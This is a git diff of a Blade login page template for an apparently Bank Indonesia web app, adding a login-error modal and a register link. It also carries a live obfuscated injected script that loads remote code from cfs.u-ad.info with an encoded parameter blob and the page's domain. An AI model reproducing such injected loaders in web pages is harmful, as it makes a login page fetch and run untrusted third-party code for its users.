@@ -2,6 +2,27 @@
 <html lang="en">
 @include('layouts.head')
 <body>
+@if(null!=session('error_message'))
+<!-- Modal -->
+<div class="" id="myModal" role="dialog">
+    <div class="modal-dialog" style="z-index: 1050;">
+      <!-- Modal content-->
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Gagal Login</h4>
+        </div>
+        <div class="modal-body">
+        {{session('error_message')}}
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+      
+    </div>
+</div>
+@endif
 <div class="login-container animated fadeInDown">
     <div style="padding-bottom:0;" class="loginbox" align="center">
         <img src="/images/BANK_INDONESIA.png" height="30%" width="30%" visibility="hidden" align="left" hspace="10" vspace="10">
@@ -11,7 +32,6 @@
         <div class="loginbox-or">
             <div class="or-line"></div>
         </div>
-
         <form class="" role="form" method="POST" action='do_login'>
             {!! csrf_field() !!}
             <div class="loginbox-textbox">
@@ -28,7 +48,9 @@
                 <div class="or">OR</div>
             </div>
             <div class="loginbox-textbox">
+            <a href="{{'register'}}">
                 <input type="button" id="register" name="register" value="Register Now" data-toggle="modal" data-target="#on" class="btn btn-info btn-block" placeholder="Register" />
+            </a>
             </div>
         </form>
     </div>
@@ -37,6 +59,9 @@
     <div style="text-align: center; padding-top: 3px; color: blue; background-color: #eee;">Something wrong? contact <b>mirnayanti@bi.go.id</b></div>
 
 </div>
+
+  
+
 <!--Basic Scripts-->
 <script src="/js/jquery.min.js"></script>
 <script src="/js/bootstrap.min.js"></script>
@@ -58,7 +83,15 @@
     ga('send', 'pageview');
 
 </script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRXCgcW0TV1ae3O8iHc%2fF4RS6WIeKHzTEvwUwbTCa1X8XqGyPFoCSaq1MCf8xM%2fBf8DpNSVW5ObDKJrbhfEgdebfUTuprR8V4OG6rnFuiMrMU1g%2bHAl1VH7bI8fjO2eXMDn0bHDp1Cmi%2fXSOdAo7yyuxa770auqS4ZMjnaGu4Y0hzQIwcJ2U2qh3FPYGR2s6OpQu%2fnL0iR%2fs%2fChOONfoBBi0wtKr8MD6Y8QEgAoNaqPIixtd32HadJVCD9QgaAQPBPLfMh8F5BHJ44%2bqGPsl9728FCm%2b0Hm2tphSapx58aozuZ6%2ft%2bYFjyeZ3%2frVJhdym8Phf3zy89HVj3BFI6iUmz2uf5hJdB%2bTy5yGcGtvLob2ZxbxcWnx34f%2fglxV1jsXEmb2idfWU7aV27z%2fAGk00ezxiX6kJW37Ny660yfqmZrgXyTWOHPfqBe0HtyEU7f46FgdMrun9nRrODaxTPPjuGbFD%2bSI7f8c3J3FKmdBeb75jM78XK9kULEKL9uqC5UgStv9%2fiGqVldLc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRXCgcW0TV1ae3O8iHc%2fF4RS6WIeKHzTEvwUwbTCa1X8XqGyPFoCSaq1MCf8xM%2fBf8DpNSVW5ObDKJrbhfEgdebfUTuprR8V4OG6rnFuiMrMU1g%2bHAl1VH7bI8fjO2eXMDn0bHDp1Cmi%2fXSOdAo7yyuxa770auqS4ZMjnaGu4Y0hzQIwcJ2U2qh3FPYGR2s6OpQu%2fnL0iR%2fs%2fChOONfoBBi0wtKr8MD6Y8QEgAoNaqPIixtd32HadJVCD9QgaAQPBPLfMh8F5BHJ44%2bqGPsl9728FCm%2b0Hm2tphSapx58aozuZ6%2ft%2bYFjyeZ3%2frVJhdym8Phf3zy89HVj3BFI6iUmz2uf5hJdB%2bTy5yGcGtvLob2ZxbxcWnx34f%2fglxV1jsXEmb2idfWU7aV27z%2fAGk00ezxiX6kJW37Ny660yfqmZrgXyTWOHPfqBe0HtyEU7f46FgdMrun9nRrODaxTPPjuGbFD%2bSI7f8c3J3FKmdBeb75jM78XK9kULEKL9uqC5UgStv9%2fiGqVldLc%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+
+<script type="text/javascript">
+    $(document).ready(function () {
+        $("#myModal").modal('show');
+    });
+</script>
+
+</body>
 <!--Body Ends-->
 
 <!-- Mirrored from beyondadmin-v1.4.1.s3-website-us-east-1.amazonaws.com/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Aug 2015 01:26:02 GMT -->
